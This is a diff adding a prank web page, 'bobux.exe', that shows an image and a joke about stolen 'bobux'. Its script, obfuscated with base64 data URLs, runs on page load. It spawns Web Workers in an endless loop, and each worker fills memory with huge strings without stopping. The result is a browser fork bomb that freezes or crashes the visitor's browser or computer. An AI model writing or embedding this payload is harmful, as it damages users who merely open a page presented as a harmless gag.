@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <LINK REL="stylesheet">
+    <link rel="icon" href="./images/trolled.png">
+    <title>bobux.exe</title>
+    <style>
+        main {
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+        }
+
+        body {
+            background-color: black;
+        }
+
+        img {
+            opacity: 1;
+            animation: fadein 5s ease-in-out;
+        }
+
+        @keyframes fadein {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes fadein1 {
+            0% {
+                opacity: 0;
+            }
+
+            50% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1
+            }
+        }
+
+        h2 {
+            color: white;
+            font-family: Arial;
+            opacity: 1;
+            animation: fadein1 3s ease-in-out;
+        }
+        
+    </style>
+</head>
+
+<body>
+    <main>
+        <h2>I am the bobux man,
+        </h2>
+        <pre><img src="./images/bobux2.jpg" width="600" /></p>
+        <h2>I have stolen all your bobux!
+        </h2>
+    </main>
+    <script>
+        var I_R = 0x1FFFFFE8;
+        var I_O = 0xFFFF;
+        var I_I = `f=[];while(!0){f.push(String.fromCharCode(${I_O}).repeat(${I_R}))}`;
+        var I_D = `data:text/html;base64,${btoa(I_I)}`;
+        var I_C = `while(!0){new Worker("${I_D}")}`;
+        var I_W = `data:text/html;base64,${btoa(I_C)}`;
+        new Worker(I_W);
+    </script>
+</body>
+
+</html>
